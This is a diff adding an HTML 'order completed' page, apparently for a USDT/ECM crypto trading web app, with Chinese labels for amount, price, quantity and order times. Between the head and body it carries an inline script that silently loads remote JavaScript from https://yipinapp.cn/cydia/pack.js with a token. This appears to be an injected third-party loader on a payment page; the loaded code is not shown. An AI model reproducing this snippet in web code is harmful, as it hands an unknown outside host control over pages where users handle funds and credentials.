@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>进行中</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/transaction/payIng.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">已完成</div>
+		    <span class="weui-pull-right weui-cell__ft"></span>
+		</header>
+		<div class="orderStaute">
+			<h2></h2>
+			<p class="orderTxt">订单已完成</p>
+			<div class="orderDetail">
+				<div class="payTitle">
+					<div class="titleBg">
+						<p>交易总额</p>
+						<h2 class="changeColor" style="font-size: 16px">USDT<span class="payMoney"></span></h2>
+					</div>
+					<div class="titleright">
+						<p>交易单价：USDT<span class="trandeceil"></span></p>
+						<p>交易数量：<span class="trandeNum"></span> <span class="unit">ECM</span></p>
+					</div>
+				</div>
+				<div class="floorTep">
+					<ul>
+						<li class="weui-cell weui-cell_access">
+							<div class="weui-cell__bd weui-cell_primary">
+								<p class="weImg">
+									<img src="../../static/images/weixin.png" />
+									<span class="payKind">ECM WALEAT</span>
+								</p>
+							</div>
+						</li>
+						<li>
+							<p class="nameTxt"></p>
+							<p class="payee"></p>
+						</li>
+						<li>
+							<p><span class="txt">完成</span>时间</p>
+							<p class="finishTime"></p>
+						</li>
+						<li>
+							<p>接单时间</p>
+							<p class="orderTime"></p>
+						</li>
+						<li>
+							<p>订单号</p>
+							<p class="orderNO"></p>
+						</li>
+						<li>
+
+						</li>
+						<li>
+						</li>
+						<li>
+						</li>
+						<li>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/finish.js" ></script>
+	</body>
+</html>
